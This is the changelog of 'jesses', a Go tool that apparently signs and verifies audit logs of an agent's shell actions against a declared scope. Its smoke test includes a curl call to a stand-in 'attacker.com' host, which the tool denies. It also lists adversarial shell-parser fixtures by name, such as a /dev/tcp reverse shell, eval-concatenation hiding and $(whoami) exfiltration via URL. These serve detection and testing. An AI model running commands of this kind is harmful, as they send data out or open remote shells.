# Changelog

All notable changes to `jesses` are recorded here. This file follows the [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) conventions.

For the full narrative build log, see [`docs/BUILD_LOG.md`](./docs/BUILD_LOG.md).

## [Unreleased]

### Added

#### Day 3+4+5 — session lifecycle, attestation envelope, verifier, CLI, viewer

The whole v0.1 product surface lands together because every piece
reaches into every other piece; splitting the commits would mean
shipping half-wired code.

- `internal/rekor/` — minimal Rekor transparency-log client.
  - `rekor.Client` interface (Upload / Fetch) — every downstream
    caller takes this interface, not a concrete type, so the session
    and verify paths stay free of HTTP plumbing.
  - `HTTPClient` speaks Sigstore Rekor v2 JSON API against
    rekor.sigstore.dev by default (configurable).
  - `FakeClient` is an in-memory implementation for tests and for
    offline CI flows, with deterministic LogID so golden-byte tests
    stay stable across runs.
- `internal/precommit/` — SCT-style session-start commitment.
  - `Compute(sessionID, scopeBytes, pubKey, t)` → `Receipt` with
    hex-encoded scope hash and pubkey + RFC3339Nano timestamp.
  - `Submit(ctx, rekor.Client, r)` uploads the canonical receipt
    body and fills `LogEntry`. Without this, the fabricate-entire-
    session attack (A3 in THREAT_MODEL.md) is undetectable — the
    whole security value proposition depends on this step.
  - `Verify(r)` re-derives the canonical body and checks that
    `LogEntry.BodyHash` matches. Rekor signature verification
    happens in `internal/verify`.
  - Schema version pinned to `v0.1` in the wire format so future
    predicate changes are detectable.
- `internal/session/` — lifecycle that binds everything.
  - `session.Open` generates a random 16-byte session ID, hashes
    the scope bytes, calls `precommit.Submit` inline (blocking; no
    skip flag — failure is a hard error), opens the `audit.Writer`,
    and writes the precommit receipt as event 0 with
    `Tool=\"jesses.precommit\"`.
  - `session.Append(Event)` auto-assigns `Seq` and accumulates
    canonical-JSON Merkle leaves alongside the append-only log.
  - `session.Close()` returns a `Finalized` bundle (session ID,
    start/end, scope hash, pubkey, signing key, Merkle root, leaf
    count, precommit receipt). No envelope is built here — that is
    `attest.Build`'s job.
- `internal/attest/` — in-toto ITE-6 envelope with jesses predicate.
  - `PredicateType = \"https://jesses.dev/v0.1/action-envelope\"`.
  - `Envelope` = `{ payloadType, payload (base64 Statement),
    signatures }` — DSSE-shaped but without full PAE at v0.1 (PAE
    comes in v0.2 for Sigstore cosign compatibility).
  - `Statement.Predicate` carries schema version, session ID,
    start/end timestamps, scope hash, hex pubkey, the full
    `precommit.Receipt`, Merkle root hex, leaf count, optional OTS
    anchor bytes. Subject.Name is the session ID; Subject.Digest
    carries the Merkle root under `sha256`.
  - `Build(Finalized)`, `Parse(Envelope)`, `WriteFile`, `ReadFile`
    round-trip byte-exactly.
- `internal/verify/` — the six-gate verifier.
  - **G1** envelope signature — ed25519 verify over the Statement
    bytes using the pubkey in the predicate.
  - **G2** merkle root — re-reads the audit log line by line,
    canonicalizes each event, recomputes the RFC 6962 tree root,
    and asserts leaf count + root match the envelope's claim.
  - **G3** rekor pre-commit — recomputes canonical receipt bytes,
    checks SHA-256 against `LogEntry.BodyHash`, and (if a
    `rekor.Client` is supplied) fetches the log entry to cross-
    check it against the local hash.
  - **G4** scope hash — reads scope.txt off disk and asserts its
    SHA-256 matches the envelope's `scope_hash`.
  - **G5** policy compliance — scans the audit log for events whose
    `Decision` is not `allow` / `commit` / `warn` and counts them
    as breaches; any breach fails the gate.
  - **G6** opentimestamps anchor — advisory; absence shows
    \"pending\" but does not mark the report invalid.
  - `verify.Render(Report)` prints a 6-line ✓/✗/⚠ summary that a
    triage analyst reads in five seconds.
  - Four end-to-end tests in `e2e_test.go`: happy path, tampered
    log fails G2, denied event fails G5, envelope write/read
    round-trip.
- `cmd/jesses/` — reference CLI (static binary, stdlib-only flag
  parsing, no cobra/kingpin).
  - `jesses verify <file>` — 6-gate verification, `-offline` skips
    Rekor, `-json` emits the Report as JSON.
  - `jesses view <file>` — spawns a localhost HTTP server on an
    ephemeral port, opens the default browser, renders a
    flight-recorder-style timeline UI, and exits automatically
    after 60 s (configurable). The viewer is a single embedded HTML
    page with inline CSS and vanilla JS — no external scripts,
    strict CSP (`default-src 'self'`).
  - `jesses run -- <cmd>` — wrap one shell command, emit a session-
    of-one `.jes` for demos.
  - `jesses hook` — stdin-driven hook mode that accepts line-
    delimited JSON tool events from an agent harness, evaluates
    each against the session's scope.txt, writes the event to the
    audit log, echoes the decision on stdout, and on the `_action:
    close` line finalizes the envelope to `session.jes`.
  - `jesses init-scope` — scaffolds a `scope.txt` with commented
    syntax examples covering all five namespaces.
  - `jesses version` / `help`.
- `cmd/jesses/viewer/index.html` — single-page attestation viewer
  embedded into the binary via `//go:embed`. Renders session
  metadata, the six-gate report with pass/fail coloring, and the
  event timeline with decision chips, destinations, and reasons.
  Style is dark-mode monospace that belongs on a bug-bounty
  analyst's screen, not a marketing page.
- End-to-end smoke test (manual, reproducible):

```
$ jesses init-scope
$ printf '{\"tool\":\"bash\",\"input\":{\"command\":\"curl https://api.target.com/users\"}}\n{\"tool\":\"bash\",\"input\":{\"command\":\"curl https://attacker.com/evil\"}}\n{\"_action\":\"close\"}\n' | jesses hook --fake-rekor
{\"decision\":\"allow\",\"destinations\":[\"api.target.com\"],\"reason\":\"in scope\"}
{\"decision\":\"deny\",\"destinations\":[\"attacker.com\"],\"reason\":\"unpoliced (strict mode)\"}
$ jesses verify --offline session.jes
session 2331…
  ✓ G1 envelope signature — ed25519 signature valid
  ✓ G2 merkle root — 3 leaves, root b056ee37…
  ✓ G3 rekor pre-commit — local hash match (log index 0)
  ✓ G4 scope hash — scope.txt matches committed hash
  ✗ G5 policy compliance — 1 of 3 events breached policy
  ⚠ G6 opentimestamps anchor — pending bitcoin confirmation
VERDICT: invalid (4/6 gates pass; mandatory gate failed)
```

- 204 tests across 6 packages, go vet clean, zero external deps in
  any package.

#### Open-source infrastructure pass — governance, CI, ADRs

- `CONTRIBUTING.md` — DCO sign-off requirement (no CLA), bit-exact invariant warnings, PR workflow, explicit scope boundaries.
- `CODE_OF_CONDUCT.md` — adopts Contributor Covenant 2.1 verbatim by reference (not inlined).
- `GOVERNANCE.md` — current BDFL model with pre-committed Commonhaus Foundation transition (Day 60 sponsorship, Day 75 application, Day 90 transfer). Post-transition Technical Committee structure defined.
- `MAINTAINERS.md` — single maintainer with honest bus factor 1 disclosure; response-commitment SLAs.
- `TRADEMARK.md` — word-mark policy, permitted uses, conformance-claim rule, defensive-filing plan.
- `.github/ISSUE_TEMPLATE/` — four templates (`bug_report.yml`, `spec_clarification.yml`, `new_extractor.yml`, `config.yml` with security-advisory redirect).
- `.github/PULL_REQUEST_TEMPLATE.md` — bit-exact impact assessment, DCO checkbox, test-coverage requirements.
- `.github/FUNDING.yml` — funding placeholder (activated at v0.1 release; points to Commonhaus fiscal sponsor at v0.2).
- `.github/workflows/ci.yml` — `go test -race` matrix across {Linux, macOS, Windows} × {Go 1.22, 1.23}, golangci-lint, govulncheck, `go mod tidy` drift check, reproducible-build validation.
- `.github/workflows/codeql.yml` — GitHub-native SAST (Go), security-and-quality query set, weekly schedule.
- `.github/workflows/scorecard.yml` — OpenSSF Scorecard weekly scan, SARIF upload, public result publication.
- `.github/workflows/dco.yml` — DCO sign-off enforcement on every pull request.
- `.github/workflows/release.yml` — GoReleaser + cosign v3 (keyless via Fulcio + Rekor) + SLSA Build Level 3 provenance via `slsa-github-generator`, SBOM (SPDX + CycloneDX via syft), placeholder for jesses self-attestation once CLI lands.
- `.github/dependabot.yml` — weekly updates for `gomod` and `github-actions` ecosystems.
- `.golangci.yml` — 22 linters enabled, `depguard` enforces the zero-external-dependencies invariant in `internal/`.
- `.goreleaser.yaml` — reproducible multi-platform build config with cosign signing and SBOM generation.
- `docs/adr/` — MADR 3.0 architecture-decision-record directory with index and 10 accepted ADRs covering every locked design decision plus the Commonhaus transition:
  - `0000-madr-template.md`, `0001-go-reference-implementation.md`, `0002-in-toto-ite6-envelope.md`, `0003-rfc6962-merkle-tree.md`, `0004-opentimestamps-rekor-only.md`, `0005-session-start-pre-commitment.md`, `0006-ed25519-software-key-v0.1.md`, `0007-dual-privacy-modes.md`, `0008-exclusion-first-policy.md`, `0009-platform-first-adoption.md`, `0010-commonhaus-over-self-foundation.md`.

#### Day 2.2b — segment splitter + substitution recursion + wrapper unwrap + shell re-entry

- `internal/shellparse/splitter.go` — `Command` / `Redirect` / `Substitution` types (JSON shape frozen); `Split` and `SplitString`; six-stage `buildCommand`; `fuseSubstitutions` pre-pass that stitches tokens back together when tokenizer split a substitution body on whitespace or separators; `substOpenCount` respecting quoting and backtick toggling; `MaxDepth = 8` with `ErrMaxDepthExceeded` / `ErrUnbalancedSubst`.
- `internal/shellparse/wrapper.go` — frozen 13-entry `wrapperTable` covering sudo / env / time / nice / timeout / stdbuf / xargs / nohup / exec / setsid / ionice / chroot / unshare with per-wrapper `stopFn` for flag and positional consumption; stacked-wrapper support (`sudo env X=y timeout 30 curl` → three wrappers stripped in order).
- `internal/shellparse/redirect.go` — `extractRedirects` handling both spaced and unspaced operator forms, `2>&1`, `&>`, `&>>`, `<<<`; `IsDevTCP` helper recognizing `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` bash raw-socket paths; correct rejection of `<(` / `>(` (these are process substitutions, not redirects).
- `internal/shellparse/subst.go` — `$(...)`, `` `...` ``, `<(...)`, `>(...)` scanning with paren-depth tracking that respects quoting; argv joined with single spaces before scanning so bodies containing shell word splits survive intact; recursive re-invocation of `Tokenize` + `splitAt` at depth+1.
- `internal/shellparse/reentry.go` — `bash -c`, `sh -c`, `dash -c`, `zsh -c`, `ksh -c` detection (plus absolute-path variants like `/bin/bash` and merged short flags like `-xc`); `eval PAYLOAD` re-tokenization; Python / Ruby / Perl / Node `-e` deliberately NOT handled here (language payloads, not shell — deferred to per-language hint packages).
- `internal/shellparse/tokenizer.go` — context-sensitive `&` handling so `>&`, `<&`, `&>`, `&>>` are preserved as redirect-operator parts instead of being split as the background separator; `TokenType.MarshalJSON` emits symbolic names so golden fixtures survive `iota` reordering.
- `internal/shellparse/testdata/segments/` — 12 real-world adversarial fixtures with paired byte-exact `.json` expected output: simple curl baseline, proxy env override, sudo exfil, `bash -c` stage-two, `eval` concatenation hiding (`"cur""l"`), `$(whoami)` exfil via URL, `/dev/tcp` reverse shell, `<()` process-sub exfil, three-layer eval bomb, stacked wrappers, backtick legacy subst, pipeline with logical chain.
- `internal/shellparse/splitter_test.go` + `wrapper_test.go` + `redirect_test.go` + `subst_test.go` + `reentry_test.go` + `golden_test.go` (with `-update` flag) + `bench_test.go` (3 benchmarks + `FuzzSplit` with 11 seeded patterns).
- Test count: 94 unit + 12 golden-driven + 11 fuzz seeds, bringing cumulative to 177 (merkle 18 + audit 6 + policy 30 + shellparse 123). `go vet ./...` clean. Zero external dependencies.
- Performance on AMD Ryzen 5 5600 (hook-path budget): `SplitSimple` 3.1 μs, `SplitAdversarial` (eval + subshell + wrapper + redirect nested) 14.6 μs, `SplitLarge` (100-segment pipeline) 133 μs. Fuzz: 1.2 M executions at 170 k/s in 10 s, zero panics, 299 new-interesting inputs captured.

#### Documentation — build log

- `docs/BUILD_LOG.md` — canonical narrative per-phase record: scope, deliverables, test count, critical invariants, current state, next milestone, decision log, session-resume protocol.

#### Day 2.2a — shell tokenizer

- `internal/shellparse/tokenizer.go` — focused POSIX shell tokenizer. Handles five command separators (`;`, `|`, `||`, `&`, `&&`), newline, three quoting modes (single / double with POSIX escapes / backslash outside quotes with line continuation), adjacent-quoted-run concatenation (the `eval "cur""l evil.com"` pattern), subshell / backtick preservation as literal content.
- `internal/shellparse/tokenizer_test.go` — 29 tests, including five real-world adversarial scenarios (proxy override, wrapper command, env assignment, `bash -c "..."` re-entry payload, `/dev/tcp/host/port` raw TCP redirection).
- `internal/shellparse/doc.go` — package scope and list of deliberately unimplemented bash constructs.
- Zero external dependencies; stdlib only.

#### Day 2.1 — scope.txt parser + five-namespace matcher + exclusion-first precedence

- `internal/policy/parser.go` — line-oriented `scope.txt` parser with shape-based namespace classification (host / path / repo / contract / mcp); `mode:` directive; `in:` / `out:` rule lines; `#` comments (full-line and inline).
- `internal/policy/matcher.go` — five match modes: host exact + anchored wildcard; path glob with `*` / `**` / `?` / character-class support; repo exact; contract case-insensitive; MCP exact-or-prefix-with-colon.
- `internal/policy/precedence.go` — exclusion-first evaluation (every `out:` before any `in:`), first-match-wins within `in:`, mode-dependent unpoliced handling.
- 30 tests, including the critical regression `TestAnchoredSubdomain` (`*.target.com` does NOT match `evil-target.com`).

#### Day 1 — Merkle tree + audit writer

- `internal/merkle/tree.go` — RFC 6962 byte-exact hashing (`HashLeaf`, `HashChildren`, `RootHash`, `RootFromLeafHashes`).
- `internal/merkle/inclusion.go` — `InclusionProof` generation (PATH algorithm) and `VerifyInclusion` (iterative per §2.1.1.2).
- `internal/merkle/consistency.go` — `ConsistencyProof` generation (SUBPROOF algorithm) and `VerifyConsistency` (per §2.1.4.2).
- `internal/merkle/rfc6962_test.go` — 18 tests, including `TestInclusionAllIndices` (exhaustive over 16 tree sizes) and `TestConsistencyAllPairs` (every `(m, n)` pair for `n ≤ 12`).
- `internal/audit/record.go` — canonical `Event` struct with fixed field order.
- `internal/audit/canonical.go` — `CanonicalJSON` deterministic serialization.
- `internal/audit/writer.go` — append-only writer with per-`Append` flock.
- `internal/audit/writer_unix.go` — `syscall.Flock` wrapper, `!windows` build tag.
- `internal/audit/writer_test.go` — 6 tests including concurrent-append (8 workers × 50 events = 400 records, no interleaving, no loss).

#### Day 0 — scaffold

- Repository structure: 35 directories with `.gitkeep` placeholders.
- Core documents: `README.md`, `ARCHITECTURE.md`, `THREAT_MODEL.md`, `SPEC.md`, `ROADMAP.md`, `SECURITY.md`, `CHANGELOG.md`.
- Build tooling: `go.mod` (Go 1.22), `Taskfile.yml`, `.gitignore`, MIT `LICENSE`.

### Changed

- `README.md` — badges row added (CI, CodeQL, OpenSSF Scorecard, License, Go Reference); "Where to look" table extended with governance and ADR links; `## Governance (pre-commit)` rewritten to reflect Commonhaus Foundation transition and withdraw the self-founded-foundation plan; `## Contributing` section added linking to `CONTRIBUTING.md` and `CODE_OF_CONDUCT.md`.
- `Taskfile.yml` — `test` / `lint` / `build` placeholders replaced with real commands (race, coverage, trimpath + buildid=); added `test-flaky`, `vuln`, `mod-tidy-check`, snapshot-release dry run.
- `.gitignore` — added `.architecture.json`, `.aider*`, `.cursor/` (editor / scanner side artifacts).
- Documentation scrub (separate commit) — depersonalized design rationale; technical claims unchanged.

### Locked design decisions

- Language: Go — single static binary; the install-time surface of other language runtimes is itself an adversarial attack surface
- Format: in-toto ITE-6 envelope + new predicate type `https://jesses.dev/v0.1/action-envelope`
- Log structure: RFC 6962 Merkle tree (byte-exact with Certificate Transparency)
- Anchors: OpenTimestamps (Bitcoin) + Rekor (Sigstore transparency log). No other blockchain.
- Pre-commitment: session-start SCT analog, mandatory
- Signing key (v0.1): software ed25519; hardware attestation (TPM / Secure Enclave / TEE) deferred to v0.3
- Strategic adoption bet: platform-first — a single platform reference integration, followed by others
